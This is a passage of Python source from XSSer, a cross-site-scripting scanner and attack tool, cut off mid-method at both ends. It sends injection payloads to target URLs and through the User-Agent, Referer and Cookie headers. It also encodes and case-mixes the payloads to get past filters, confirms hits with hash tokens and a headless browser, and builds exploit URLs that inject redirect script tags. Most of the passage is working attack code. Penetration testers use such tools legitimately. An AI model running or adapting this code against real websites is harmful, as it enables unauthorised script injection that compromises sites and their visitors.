            def _error_cb(request, error):
                self.error_attack_url_payload(c, url, request, error)
            dest_url = dest_url.strip().replace("/", "", 1)
            c.agent = agent
            c.referer = referer
            c.cookie = cookie
            pool.addRequest(c.post, [[url, dest_url, headers]], _cb, _error_cb)
            self._ongoing_requests += 1

    def error_attack_url_payload(self, c, url, request, error):
        self._ongoing_requests -= 1
        for reporter in self._reporters:
            reporter.mosquito_crashed(url, str(error[0]))
        dest_url = request.args[0]
        self.report("[Error] Failed attempt (URL Malformed!?): " + url + "\n")
        self.urlmalformed = True
        if self.urlmalformed == True and self.urlspoll[0] == url:
            self.land()
        if DEBUG == True:
            self.report(str(error[0]))
            traceback.print_tb(error[2])
        c.close()
        del c
        return

    def finish_attack_url_payload(self, c, request, result, payload,
                                  query_string, url, dest_url):
        self.round_complete = self.round_complete + 1
        self.report("="*75)
        self.report("[*] Test: [ "+str(self.round_complete)+"/"+str(self.rounds)+" ] <-> "+str(self.time))
        self.report("="*75)
        self.report("\n[+] Target: \n\n [ "+ str(url) + " ]\n")
        self._ongoing_requests -= 1
        # adding constant head check number flag
        if self.options.isalive:
            self.flag_isalive_num = int(self.options.isalive)
        if not self.options.isalive:
           pass
        elif self.options.isalive and not self.options.nohead:
            self.errors_isalive = self.errors_isalive + 1
            if self.errors_isalive > self.options.isalive:
                pass
            else:
                self.report("---------------------")
                self.report("Alive Checker for: " + url + " - [", self.errors_isalive, "/", self.options.isalive, "]\n")
            if self.next_isalive == True:
                hc = Curl()
                self.next_isalive = False
                try:
                    urls = hc.do_head_check([url])
                except:
                    print("[Error] Target url: (" + url + ") is unaccesible!" + " [DISCARDED]" + "\n")
                    self.errors_isalive = 0
                    return
                if str(hc.info()["http-code"]) in ["200", "302", "301", "401"]:
                    print("HEAD alive check: OK" + "(" + hc.info()["http-code"] + ")\n")
                    print("- Your target still Alive: " + "(" + url + ")")
                    print("- If you are receiving continuous 404 errors requests on your injections but your target is alive is because:\n")
                    print("          - your injections are failing: normal :-)")
                    print("          - maybe exists some IPS/NIDS/... systems blocking your requests!\n")
                else:
                    if str(hc.info()["http-code"]) == "0":
                        print("\n[Error] Target url: (" + url + ") is unaccesible!" + " [DISCARDED]" + "\n")
                    else:
                        print("HEAD alive check: FAILED" + "(" + hc.info()["http-code"] + ")\n")
                        print("- Your target " + "(" + url + ")" + " looks that is NOT alive")
                        print("- If you are receiving continuous 404 errors requests on payloads\n  and this HEAD pre-check request is giving you another 404\n  maybe is because; target is down, url malformed, something is blocking you...\n- If you haven't more than one target then try to; STOP THIS TEST!!\n")
                self.errors_isalive = 0
            else:
                if str(self.errors_isalive) >= str(self.options.isalive):
                    self.report("---------------------")
                    self.report("\nAlive System: XSSer is checking if your target still alive. [Waiting for reply...]\n")
                    self.next_isalive = True
                    self.options.isalive = self.flag_isalive_num
        else:
            if self.options.isalive and self.options.nohead:
                self.report("---------------------")
                self.report("Alive System DISABLED!: XSSer is using a pre-check HEAD request per target by default to perform better accurance on tests\nIt will check if target is alive before inject all the payloads. try (--no-head) with (--alive <num>) to control this checker limit manually")
                self.report("---------------------")
        # check results an alternative url, choosing method and parameters, or not
        if self.options.altm == None or self.options.altm not in ["GET", "POST", "post"]:
            self.options.altm = "GET"
        if self.options.altm == "post":
            self.options.altm = "POST"
        if self.options.alt == None:
            pass
        else:
            self.report("="*45)
            self.report("\n[+] Checking Response Options:", "\n")
            self.report("[+] Url:", self.options.alt)
            self.report("[-] Method:", self.options.altm)
            if self.options.ald:
                self.report("[-] Parameter(s):", self.options.ald, "\n")
            else:
                self.report("[-] Parameter(s):", query_string, "\n")
        if c.info()["http-code"] in ["200", "302", "301"]:
            if self.options.statistics:
                self.success_connection = self.success_connection + 1
            self._report_attack_success(c, dest_url, payload,
                                        query_string, url)
        else:
            self._report_attack_failure(c, dest_url, payload,
                                        query_string, url)
        # checking response results 
        if self.options.alt == None:
            pass
        else:
            self.report("="*45)
            self.report("\n[+] Checking Response Results:", "\n")
            url_orig_hash = self._ongoing_attacks['url']
            self.report("Searching using", self.options.altm, "for:", url_orig_hash, "on alternative url\n")
            if 'PAYLOAD' in payload['payload']:
                user_attack_payload = payload['payload'].replace('PAYLOAD', url_orig_hash)
            if 'XSS' in payload['payload']:
                user_attack_payload = payload['payload'].replace('XSS', url_orig_hash)
            if 'X1S' in payload['payload']:
                user_attack_payload = payload['payload'].replace('X1S', url_orig_hash)
            if self.options.ald:
                query_string = self.options.ald
            if "VECTOR" in self.options.alt:
                dest_url = self.options.alt
            else:
                if not dest_url.endswith("/"):
                    dest_url = dest_url + "/"
            if self.options.altm == 'POST':
                dest_url = "" + query_string + user_attack_payload
                dest_url = dest_url.strip().replace("/", "", 1)
                data = c.post(url, dest_url, None)
            else:
                dest_url = self.options.alt + query_string + user_attack_payload
                c.get(dest_url)
            # perform check response injection
            if c.info()["http-code"] in ["200", "302", "301"]:
                if self.options.statistics:
                    self.success_connection = self.success_connection + 1
                self._report_attack_success(c, dest_url, payload,
                                            query_string, url)
            else:
                self._report_attack_failure(c, dest_url, payload,
                                            query_string, url)
        c.close()
        del c

    def encoding_permutations(self, enpayload_url):
        """
        perform encoding permutations on the url and query_string.
        """
        options = self.options
        if options.Cem: 
            enc_perm = options.Cem.split(",")
            for _enc in enc_perm:
                enpayload_url = self.encmap[_enc](enpayload_url)
        else: 
            for enctype in list(self.encmap.keys()):
                if getattr(options, enctype):
                    enpayload_url = self.encmap[enctype](enpayload_url)
        return enpayload_url

    def _report_attack_success(self, curl_handle, dest_url, payload,\
                               query_string, orig_url):
        """
        report connection success when attacking
        """
        if not orig_url in self.successful_urls:
            self.successful_urls.append(orig_url)
        options = self.options
        current_hashes = [] # to check for ongoing hashes
        if payload['browser'] == "[Heuristic test]":
            for key, value in self.hashed_injections.items():
                if str(key) in dest_url:
                    if key not in current_hashes:
                        self.final_hashes[key] = value
                        current_hashes.append(key)
        elif self.options.hash:
            for key, value in self.hashed_injections.items():
                self.final_hashes[key] = value
                current_hashes.append(key)
        else:
            self.report("-"*45)
            self.report("\n[!] Hashing: \n")
            for key, value in self.hashed_injections.items():
                if str(key) in str(dest_url):
                    if key not in current_hashes:
                        self.report(" [ " +key+" ] : [" , value + " ]")
                        self.final_hashes[key] = value
                        current_hashes.append(key)
                else:
                    if payload["browser"] == "[Data Control Protocol Injection]": # [DCP Injection]
                        b64_string = payload["payload"].split("[B64]")
                        b64_string = b64_string[1]
                        b64_string = b64_string.replace('PAYLOAD', key)
                        b64_string = b64encode(b64_string)
                        b64_string = urllib.parse.urlencode({'':b64_string})
                        if b64_string.startswith("="):
                            b64_string = b64_string.replace("=", "")
                        if str(b64_string) in str(dest_url):
                            if key not in current_hashes:
                                self.report(" [ " +key+" ] : [" , value + " ]")
                                self.final_hashes[key] = value
                                current_hashes.append(key)
                    else: # when using encoders (Str, Hex, Dec...)
                        if self.options.Str or self.options.Une or self.options.Mix or self.options.Dec or self.options.Hex or self.options.Hes or self.options.Cem:
                            if "PAYLOAD" in payload["payload"]:
                                payload_string = payload["payload"].replace("PAYLOAD", key)
                            elif "VECTOR" in payload["payload"]:
                                payload_string = payload["payload"].replace("VECTOR", key)
                            elif "XSS" in payload["payload"]:
                                payload_string = payload["payload"].replace("XSS", key)
                            elif "X1S" in payload["payload"]:
                                payload_string = payload["payload"].replace("X1S", key)
                            if self.options.Cem:
                                enc_perm = options.Cem.split(",")
                                for e in enc_perm:
                                    hashed_payload = self.encoding_permutations(payload_string)
                                    if e == "Str":
                                        hashed_payload = hashed_payload.replace(",", "%2C")
                                        dest_url = dest_url.replace(",", "%2C")
                                    if e == "Mix":
                                        hashed_payload=urllib.parse.quote(hashed_payload)
                                        dest_url = urllib.parse.quote(dest_url)
                                    if e == "Dec":
                                        hashed_payload = hashed_payload.replace("&#", "%26%23")
                                        dest_url = dest_url.replace("&#", "%26%23")
                                    if e == "Hex":
                                        hashed_payload = hashed_payload.replace("%", "%25")
                                        dest_url = dest_url.replace("%", "%25")
                                    if e == "Hes":
                                        hashed_payload = hashed_payload.replace("&#", "%26%23")
                                        hashed_payload = hashed_payload.replace(";", "%3B")
                                        dest_url = dest_url.replace("&#", "%26%23")
                                        dest_url = dest_url.replace(";", "%3B")
                            else:
                                hashed_payload = self.encoding_permutations(payload_string)
                                if self.options.Str:
                                    hashed_payload = hashed_payload.replace(",", "%2C")
                                    dest_url = dest_url.replace(",", "%2C")
                                if self.options.Mix:
                                    hashed_payload=urllib.parse.quote(hashed_payload)
                                    dest_url = urllib.parse.quote(dest_url)
                                if self.options.Dec:
                                    hashed_payload = hashed_payload.replace("&#", "%26%23")
                                    dest_url = dest_url.replace("&#", "%26%23")
                                if self.options.Hex:
                                    hashed_payload = hashed_payload.replace("%", "%25")
                                    dest_url = dest_url.replace("%", "%25")
                                if self.options.Hes:
                                    hashed_payload = hashed_payload.replace("&#", "%26%23")
                                    hashed_payload = hashed_payload.replace(";", "%3B")
                                    dest_url = dest_url.replace("&#", "%26%23")
                                    dest_url = dest_url.replace(";", "%3B")
                            if str(hashed_payload) in str(dest_url):
                                if key not in current_hashes:
                                    self.report(" [ " +key+" ] : [" , value + " ]")
                                    self.final_hashes[key] = value
                                    current_hashes.append(key)
            if self.extra_hashed_injections:
                for k, v in self.extra_hashed_injections.items():
                    payload_url = str(v[1])
                    if payload_url == payload["payload"]:
                        if k not in current_hashes:
                            self.report(" [ " +k+" ] : [" , v[0] + " ]")
                            self.final_hashes[k] = v[0]
                            current_hashes.append(k)
            self.report("\n"+"-"*45+"\n")
        if payload['browser'] == "[Heuristic test]":
            self.report("[+] Checking: " + str(payload['payload']).strip('XSS'), "\n")
        else:
            if self.extra_hashed_injections:
                extra_attacks=[]
                if options.xsa:
                    extra_attacks.append("XSA")
                if options.xsr:
                    extra_attacks.append("XSR")
                if options.coo:
                    extra_attacks.append("COO")
                if extra_attacks:
                    extra_attacks = "+ "+ str(extra_attacks)
                if options.postdata:
                    self.report("[*] Trying: " + extra_attacks + "\n\n" + orig_url.strip(), "(POST:", query_string + ") \n")
                else:
                    self.report("[*] Trying: " + extra_attacks + "\n\n" + dest_url.strip()+"\n")
            else:
                if options.postdata:
                    self.report("[*] Trying: \n\n" + orig_url.strip(), "(POST:", query_string + ")\n")
                else:
                    self.report("[*] Trying: \n\n" + dest_url.strip()+"\n")
            if not self.options.hash and not self.options.script:
                if not "XSS" in dest_url or not "X1S" in dest_url and self.options.xsa or self.options.xsr or self.options.coo:
                    pass
                else:
                    self.report("-"*45)
        if payload['browser'] == "[Heuristic test]" or payload['browser'] == "[hashed_precheck_system]" or payload['browser'] == "[manual_injection]":
            pass
        else:
            if not "XSS" in dest_url or not "X1S" in dest_url:
                if self.options.xsa or self.options.xsr or self.options.coo:
                    pass
                else:
                    self.report("-"*45)
                    self.report("\n[+] Vulnerable(s): \n\n " + payload['browser'] + "\n")
                    if not self.options.verbose:
                        self.report("-"*45 + "\n")
            else:
                self.report("-"*45)
                self.report("\n[+] Vulnerable(s): \n\n " + payload['browser'] + "\n")
                if not self.options.verbose:
                    self.report("-"*45 + "\n")
        # statistics injections counters
        if payload['browser']=="[hashed_precheck_system]" or payload['browser']=="[Heuristic test]":
            self.check_positives = self.check_positives + 1
        elif payload['browser']=="[Data Control Protocol Injection]":
            self.dcp_injection = self.dcp_injection + 1
        elif payload['browser']=="[Document Object Model Injection]":
            self.dom_injection = self.dom_injection + 1
        elif payload['browser']=="[Induced Injection]":
            self.httpsr_injection = self.httpsr_injection + 1
        elif payload['browser']=="[manual_injection]":
            self.manual_injection = self.manual_injection + 1
        else:
            self.auto_injection = self.auto_injection +1
        if not self.hashed_injections:
            for k, v in self.extra_hashed_injections.items():
                if k in current_hashes:
                    if v[0] == "XSA":
                        agent = v[1]
                        agent = agent.replace("PAYLOAD", k)
                        Curl.agent = agent
                    if v[0] == "XSR":
                        referer = v[1]
                        referer = referer.replace("PAYLOAD", k)
                        Curl.referer = referer
                    if v[0] == "COO":
                        cookie = v[1]
                        cookie = cookie.replace("PAYLOAD", k)
                        Curl.cookie = cookie
        else:
            for key, value in self.hashed_injections.items():
                for k, v in self.extra_hashed_injections.items():
                    payload_url = v[1]
                    payload_url = payload_url.replace("PAYLOAD",key)
                    payload_url = payload_url.replace(" ", "+") # black magic!
                    final_dest_url = str(urllib.parse.unquote(dest_url.strip()))
                    if payload_url in final_dest_url:
                        if v[0] == "XSA":
                            agent = v[1]
                            agent = agent.replace("PAYLOAD", k)
                            Curl.agent = agent
                        if v[0] == "XSR":
                            referer = v[1]
                            referer = referer.replace("PAYLOAD", k)
                            Curl.referer = referer
                        if v[0] == "COO":
                            cookie = v[1]
                            cookie = cookie.replace("PAYLOAD", k)
                            Curl.cookie = cookie
                    else:
                        if k in current_hashes:
                            if v[0] == "XSA":
                                agent = v[1]
                                agent = agent.replace("PAYLOAD", k)
                                Curl.agent = agent
                            if v[0] == "XSR":
                                referer = v[1]
                                referer = referer.replace("PAYLOAD", k)
                                Curl.referer = referer
                            if v[0] == "COO":
                                cookie = v[1]
                                cookie = cookie.replace("PAYLOAD", k)
                                Curl.cookie = cookie
        if options.verbose:
            self.report("-"*45)
            self.report("\n[+] HTTP Headers Verbose:\n")
            self.report(" [Client Request]")
            Curl.print_options()
            self.report(" [Server Reply]\n")
            self.report(curl_handle.info())
        self.report("="*45)
        self.report("[*] Injection(s) Results:")
        self.report("="*45 + "\n")
        if payload['browser']=="[Heuristic test]":
            for key, value in self.final_hashes.items():
                if str(key) in dest_url:
                    heuristic_string = key
                    heuristic_param = str(payload['payload']).strip('XSS')
                    # checking heuristic responses
                    if heuristic_string in curl_handle.body():
                        # ascii
                        if heuristic_param == "\\":
                            self.heuris_backslash_found = self.heuris_backslash_found + 1
                        # / same as ASCII and Unicode
                        elif heuristic_param == "/":
                            self.heuris_slash_found = self.heuris_slash_found + 1
                            self.heuris_une_slash_found = self.heuris_une_slash_found + 1
                        elif heuristic_param == ">":
                            self.heuris_mayor_found = self.heuris_mayor_found + 1
                        elif heuristic_param == "<":
                            self.heuris_minor_found = self.heuris_minor_found + 1
                        elif heuristic_param == ";":
                            self.heuris_semicolon_found = self.heuris_semicolon_found + 1
                        elif heuristic_param == "'":
                            self.heuris_colon_found = self.heuris_colon_found + 1
                        elif heuristic_param == '"':
                            self.heuris_doublecolon_found = self.heuris_doublecolon_found + 1
                        elif heuristic_param == "=":
                            self.heuris_equal_found = self.heuris_equal_found + 1
                        # une
                        elif heuristic_param == "%5C":
                            self.heuris_une_backslash_found = self.heuris_une_backslash_found + 1
                        elif heuristic_param == "%3E":
                            self.heuris_une_mayor_found = self.heuris_une_mayor_found + 1
                        elif heuristic_param == "%3C":
                            self.heuris_une_minor_found = self.heuris_une_minor_found + 1
                        elif heuristic_param == "%3B":
                            self.heuris_une_semicolon_found = self.heuris_une_semicolon_found + 1
                        elif heuristic_param == "%27":
                            self.heuris_une_colon_found = self.heuris_une_colon_found + 1
                        elif heuristic_param == "%22":
                            self.heuris_une_doublecolon_found = self.heuris_une_doublecolon_found + 1
                        elif heuristic_param == "%3D":
                            self.heuris_une_equal_found = self.heuris_une_equal_found + 1
                        # dec
                        elif heuristic_param == "&#92":
                            self.heuris_dec_backslash_found = self.heuris_dec_backslash_found + 1
                        elif heuristic_param == "&#47":
                            self.heuris_dec_slash_found = self.heuris_dec_slash_found + 1
                        elif heuristic_param == "&#62":
                            self.heuris_dec_mayor_found = self.heuris_dec_mayor_found + 1
                        elif heuristic_param == "&#60":
                            self.heuris_dec_minor_found = self.heuris_dec_minor_found + 1
                        elif heuristic_param == "&#59":
                            self.heuris_dec_semicolon_found = self.heuris_dec_semicolon_found + 1
                        elif heuristic_param == "&#39":
                            self.heuris_dec_colon_found = self.heuris_dec_colon_found + 1
                        elif heuristic_param == "&#34":
                            self.heuris_dec_doublecolon_found = self.heuris_dec_doublecolon_found + 1
                        elif heuristic_param == "&#61":
                            self.heuris_dec_equal_found = self.heuris_dec_equal_found + 1
                        self.add_success(dest_url, heuristic_param, value, query_string, orig_url, 'heuristic') # success!
                    else:
                        if heuristic_param == "\\":
                            self.heuris_backslash_notfound = self.heuris_backslash_notfound + 1
                        elif heuristic_param == "/":
                            self.heuris_slash_notfound = self.heuris_slash_notfound + 1
                        elif heuristic_param == ">":
                            self.heuris_mayor_notfound = self.heuris_mayor_notfound + 1
                        elif heuristic_param == "<":
                            self.heuris_minor_notfound = self.heuris_minor_notfound + 1
                        elif heuristic_param == ";":
                            self.heuris_semicolon_notfound = self.heuris_semicolon_notfound + 1
                        elif heuristic_param == "'":
                            self.heuris_colon_notfound = self.heuris_colon_notfound + 1
                        elif heuristic_param == '"':
                            self.heuris_doublecolon_notfound = self.heuris_doublecolon_notfound + 1
                        elif heuristic_param == "=":
                            self.heuris_equal_notfound = self.heuris_equal_notfound + 1
                        self.add_failure(dest_url, heuristic_param, value, query_string, orig_url, 'heuristic') # heuristic fail
        elif self.options.hash:
            for key, value in self.final_hashes.items():
                if str(key) in dest_url:
                    if key in curl_handle.body():
                        self.add_success(dest_url, key, value, query_string, orig_url, 'hashing check') # success!
                    else:
                        self.add_failure(dest_url, key, value, query_string, orig_url, 'hashing check') # hashing_check fail
        else:
            for key, value in self.final_hashes.items(): 
                if key in current_hashes:
                    if "XSA" in value:
                        method = "XSA"
                        hashing = key
                    elif "XSR" in value:
                        method = "XSR"
                        hashing = key
                    elif "COO" in value:
                        method = "COO"
                        hashing = key
                    else:
                        method = value
                        hashing = key
                    if not hashing:
                        pass
                    else:
                        if hashing not in dest_url:
                            if key in current_hashes:
                                if payload["browser"] == "[Data Control Protocol Injection]": # [DCP Injection]
                                    b64_string = payload["payload"].split("[B64]")
                                    b64_string = b64_string[1]
                                    b64_string = b64_string.replace('PAYLOAD', key)
                                    b64_string = b64encode(b64_string)
                                    b64_string = urllib.parse.urlencode({'':b64_string})
                                    if b64_string.startswith("="):
                                        b64_string = b64_string.replace("=", "")
                                    if str(b64_string) in str(dest_url):
                                        self.check_hash_on_target(hashing, dest_url, orig_url, payload, query_string, method, curl_handle)                            
                                else:
                                    self.check_hash_on_target(hashing, dest_url, orig_url, payload, query_string, method, curl_handle)                            
                        else:
                            self.check_hash_on_target(hashing, dest_url, orig_url, payload, query_string, method, curl_handle)
        self.report("")

    def check_hash_on_target(self, hashing, dest_url, orig_url, payload, query_string, method, curl_handle):
        options = self.options
        c_info = str(curl_handle.info())
        c_body = str(curl_handle.body())
        if payload["browser"] == "[Data Control Protocol Injection]": # [DCP Injection]
            b64_string = payload["payload"].split("[B64]")
            b64_string = b64_string[1]
            b64_string = b64_string.replace('PAYLOAD', hashing)
            b64_string = b64encode(b64_string)
            if b64_string.startswith("="):
                b64_string = b64_string.replace("=", "")
            hashing = b64_string
        if payload['browser'] == "[Document Object Model Injection]":
            self.check_hash_using_dom(dest_url, payload, hashing, query_string, orig_url, method) # check hash using internal headless browser engine
        else:
            if str(hashing) in c_body and "http-code: 200" in c_info: # [XSS CHECKPOINT: anti-false positives]
                self.check_false_positives(hashing, c_body, dest_url, payload, query_string, orig_url, method)
            else:
                self.add_failure(dest_url, payload, hashing, query_string, orig_url, method) # failed!

    def check_hash_using_dom(self, dest_url, payload, hashing, query_string, orig_url, method):
        if self.cookie_set_flag == False:
            self.generate_headless_cookies(orig_url)
            self.cookie_set_flag = True # cookie has been set!
        try:
            self.driver.get(dest_url) # GET
            src = self.driver.page_source
        except self.dom_browser_alert as alert_text: # handled with UnexpectedAlertPresentException 
            if (hashing in str(alert_text)): # [XSS DOM CHECKPOINT: alert() dialog open!]
                self.add_success(dest_url, payload, hashing, query_string, orig_url, method) # success!
                self.token_arrived_hashes.append(hashing) # add token/hashing for counting
            else:
                self.add_failure(dest_url, payload, hashing, query_string, orig_url, method) # failed!
        else:
            self.add_failure(dest_url, payload, hashing, query_string, orig_url, method) # failed!

    def check_false_positives(self, hashing, c_body, dest_url, payload, query_string, orig_url, method): # some anti false positives checkers
        if str(self.options.discode) in c_body: # provided by user
            self.report("[Info] Reply contains code [ --discode ] provided to be discarded -> [DISCARDING!]\n")
            self.add_failure(dest_url, payload, hashing, query_string, orig_url, method) # failed!
        else:
            if str('&gt;' + hashing) in c_body or str('href=' + dest_url + hashing) in c_body or str('content=' + dest_url + hashing) in c_body:
                self.report("[Info] Reply looks like a 'false positive' -> [DISCARDING!]\n")
                self.add_failure(dest_url, payload, hashing, query_string, orig_url, method) # failed!
            elif str(hashing+",") in c_body or str(hashing+'","') in c_body:
                self.report("[Info] Reply looks like a 'false positive' -> [DISCARDING!]\n")
                self.add_failure(dest_url, payload, hashing, query_string, orig_url, method) # failed!
            else:
                if self.options.discode:
                    self.report("[Info] Reply does NOT contain code [ --discode ] provided to be discarded -> [ADDING!] ;-)\n")
                self.add_success(dest_url, payload, hashing, query_string, orig_url, method) # success!       

    def add_failure(self, dest_url, payload, hashing, query_string, orig_url, method='url'):
        """
        Add an attack that failed to inject
        """
        if method == "heuristic":
            self.report(" [NOT FOUND] -> [ " + str(payload) + " ] : [ " + str(hashing)+ " ]")
            self.hash_notfound.append((dest_url, "[Heuristic test]", method, hashing, query_string, payload, orig_url))
        elif method == "hashing check":
            self.report(" [NOT FOUND] -> [ " + str(hashing) + " ] : [ hashing_check ]")
            self.hash_notfound.append((dest_url, "[hashing check]", method, hashing, query_string, payload, orig_url))
        else:
            self.report(" [NOT FOUND] -> [ " + hashing + " ] : [ " + method + " ]")
            self.hash_notfound.append((dest_url, payload['browser'], method, hashing, query_string, payload, orig_url))
          
    def add_success(self, dest_url, payload, hashing, query_string, orig_url, method='url'):
        """
        Add an attack that have managed to inject code
        """
        if method == "heuristic":
            self.report(" [FOUND !!!] -> [ " + str(payload) + " ] : [ " + str(hashing)+ " ]")
            self.hash_found.append((dest_url, "[Heuristic test]", method, hashing, query_string, payload, orig_url))
        elif method == "hashing check":
            self.report(" [FOUND !!!] -> [ " + str(payload) + " ] : [ " + str(hashing)+ " ]")
            self.hash_found.append((dest_url, "[hashing check]", method, hashing, query_string, payload, orig_url))
        else:
            payload_sub =  payload['payload']
            self.report(" [FOUND !!!] -> [ " + hashing + " ] : [ " + method + " ]")
            self.hash_found.append((dest_url, payload['browser'], method, hashing, query_string, payload, orig_url))
        for reporter in self._reporters:
            reporter.add_success(dest_url)
        if self.options.reversecheck:
            if self.options.dcp or self.options.inducedcode or self.options.dom:
                pass
            else:
                self.do_token_check(orig_url, hashing, payload, query_string, dest_url)

    def create_headless_embed_browser(self): # selenium + firefox + gecko(bin)
        agents = [] # user-agents
        self.cookie_set_flag = False # used for cookie
        f = open("core/fuzzing/user-agents.txt").readlines() # set path for user-agents
        for line in f:
            agents.append(line)
        try:
            agent = random.choice(agents).strip() # set random user-agent
        except:
            agent = "Privoxy/1.0" # set static user-agent
        try:
            from selenium import webdriver
            from selenium.webdriver.firefox.options import Options as FirefoxOptions
            from selenium.common.exceptions import UnexpectedAlertPresentException as UnexpectedAlertPresentException # used for search alert dialogs at DOM
        except:
            print("\n[Error] Importing: selenium lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-selenium'\n")
            sys.exit(2)
        try:
            self.dom_browser_alert = UnexpectedAlertPresentException
            profile = webdriver.FirefoxProfile()
            profile.set_preference("general.useragent.override", str(agent)) # set Firefox (profile) - random user-agent
            profile.set_preference('browser.safebrowsing.enabled', True)
            profile.set_preference('toolkit.telemetry.enabled', False)
            profile.set_preference('webdriver_accept_untrusted_certs', True)
            profile.set_preference('security.insecure_field_warning.contextual.enabled', False)
            profile.set_preference('security.insecure_password.ui.enabled', False)
            profile.set_preference('extensions.logging.enabled', False)
            options = FirefoxOptions()
            options.add_argument("-headless") # set Firefox (options) - headless mode
            options.add_argument("-no-remote")
            options.add_argument("-no-first-run")
            options.add_argument("-app")
            options.add_argument("-safe-mode")
            current_dir = os.getcwd()
            driver = webdriver.Firefox(options=options, firefox_profile=profile, executable_path=current_dir+"/core/driver/geckodriver", log_path=os.devnull) # wrapping!
        except:
            driver = None
            self.token_arrived_flag = False
            if DEBUG == True: 
                traceback.print_exc()
        return driver

    def generate_GET_token_payload(self, orig_url, dest_url, query_string, hashing, payload, vector_found):
        if "VECTOR" in orig_url:
           dest_url = orig_url
        else:
            if not dest_url.endswith("/"):
                dest_url = dest_url + "/"
        dest_url = orig_url + query_string
        dest_url = dest_url.split("#")[0]
        p_uri = urlparse(dest_url)
        uri = p_uri.netloc
        path = p_uri.path
        target_params = parse_qs(urlparse(dest_url).query, keep_blank_values=False)
        for key, value in target_params.items():
            if key == vector_found: # only replace parameters with valid hashes
                target_params[key] = payload['payload']
            else:
                target_params[key] = target_params[key][0]
        target_url_params = urllib.parse.urlencode(target_params)
        dest_url = p_uri.scheme + "://" + uri + path + "?" + target_url_params
        dest_url = urllib.parse.unquote(dest_url)
        tok_url = self.generate_token_exploit(hashing, dest_url, payload)
        return tok_url

    def generate_POST_token_payload(self, orig_url, dest_url, query_string, hashing, payload, vector_found):
        if vector_found in dest_url:
            v = dest_url.split(vector_found+"=")[1]
            p = v.split("&")[0]
            dest_url = dest_url.replace(p, payload['payload'])
        dest_url = urllib.parse.unquote(dest_url)
        tok_url = self.generate_token_exploit(hashing, dest_url, payload)
        return tok_url

    def generate_token_exploit(self, hashing, dest_url, payload):
        self_url = "http://localhost:19084/success/" + hashing
        shadow_js_inj = "document.location=document.location.hash.substring(1)"
        shadow_inj = "<SCrIpT>" + shadow_js_inj + "</ScRiPt>"
        _e = self.encoding_permutations
        if self.options.script: # manual injections
            if 'XSS' in dest_url:
                dest_url = dest_url.replace('XSS', hashing)
            elif 'XS1' in dest_url:
                dest_url = dest_url.replace('XS1', hashing)
            if "'>" in dest_url:
                dest_url = dest_url.split("'>")[0]
                tok_url = dest_url + _e("'>" + shadow_inj)
                tok_url += '#' + self_url
            elif '">' in dest_url:
                dest_url = dest_url.split('">')[0]
                tok_url = dest_url + _e('">' + shadow_inj)
                tok_url += '#' + self_url
            elif 'onerror=' in dest_url:
                dest_url = dest_url.split('onerror=')[0]
                tok_url = dest_url + _e('onerror=' + shadow_js_inj + ">")
                tok_url+= '#' + self_url
            elif 'onError=' in dest_url:
                dest_url = dest_url.split('onError=')[0]
                tok_url = dest_url + _e('onError=' + shadow_js_inj + ">")
                tok_url+= '#' + self_url
            elif 'onload=' in dest_url:
                dest_url = dest_url.split('onload=')[0]
                tok_url = dest_url + _e('onload=' + shadow_js_inj + ">")
                tok_url+= '#' + self_url
            elif 'onLoad=' in dest_url:
                dest_url = dest_url.split('onLoad=')[0]
                tok_url = dest_url + _e('onLoad=' + shadow_js_inj + ">")
                tok_url+= '#' + self_url
            else:
                tok_url = dest_url + "#" + self_url
        else: # default + auto injections
            if 'VECTOR' in dest_url:
                dest_url = dest_url.replace('VECTOR', payload['payload'])
            if '">PAYLOAD' in dest_url:
                tok_url = dest_url.replace('">PAYLOAD', _e('">' + shadow_inj))
                tok_url += '#' + self_url
            elif "'>PAYLOAD" in dest_url:
                tok_url = dest_url.replace("'>PAYLOAD", _e("'>" + shadow_inj))
                tok_url += '#' + self_url
            elif "javascript:PAYLOAD" in dest_url:
                tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
                tok_url = dest_url.replace("javascript:PAYLOAD", _e("javascript:" + shadow_js_inj))
                tok_url+= '#' + self_url
            elif '"PAYLOAD"' in dest_url:
                tok_url = dest_url.replace('"PAYLOAD"', '"' + self_url + '"')
            elif "'PAYLOAD'" in dest_url:
                tok_url = dest_url.replace("'PAYLOAD'", "'" + self_url + "'")
            elif 'PAYLOAD' in dest_url and 'SRC' in dest_url:
                tok_url = dest_url.replace('PAYLOAD', self_url)
            elif "SCRIPT" in dest_url:
                tok_url = dest_url.replace('PAYLOAD', shadow_js_inj)
                tok_url += '#' + self_url
            elif 'onerror="PAYLOAD"' in dest_url:
                tok_url = dest_url.replace('onerror="PAYLOAD"', _e('onerror="' + shadow_inj + '"'))
                tok_url+= '#' + self_url
            elif 'onerror="javascript:PAYLOAD"' in dest_url:
                tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
                tok_url = dest_url.replace('onerror="javascript:PAYLOAD"', _e('onerror="javascript:' + shadow_js_inj + '"'))
                tok_url+= '#' + self_url
            elif 'onError="PAYLOAD"' in dest_url:
                tok_url = dest_url.replace('onError="PAYLOAD"', _e('onError="' + shadow_inj + '"'))
                tok_url+= '#' + self_url
            elif 'onError="javascript:PAYLOAD"' in dest_url:
                tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
                tok_url = dest_url.replace('onError="javascript:PAYLOAD"', _e('onError="javascript:' + shadow_js_inj + '"'))
                tok_url+= '#' + self_url
            elif 'onload="PAYLOAD"' in dest_url:
                tok_url = dest_url.replace('onload="PAYLOAD"', _e('onload="' + shadow_inj + '"'))
                tok_url+= '#' + self_url
            elif 'onload="javascript:PAYLOAD"' in dest_url:
                tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
                tok_url = dest_url.replace('onload="javascript:PAYLOAD"', _e('onload="javascript:' + shadow_js_inj + '"'))
                tok_url+= '#' + self_url
            elif 'onLoad="PAYLOAD"' in dest_url:
                tok_url = dest_url.replace('onLoad="PAYLOAD"', _e('onLoad="' + shadow_inj + '"'))
                tok_url+= '#' + self_url
            elif 'onLoad="javascript:PAYLOAD"' in dest_url:
                tok_url = dest_url.replace('javascript:PAYLOAD', self.encoding_permutations("window.location='" + self_url+"';"))
                tok_url = dest_url.replace('onLoad="javascript:PAYLOAD"', _e('onLoad="javascript:' + shadow_js_inj + '"'))
                tok_url+= '#' + self_url
            elif '<PAYLOAD>' in dest_url:
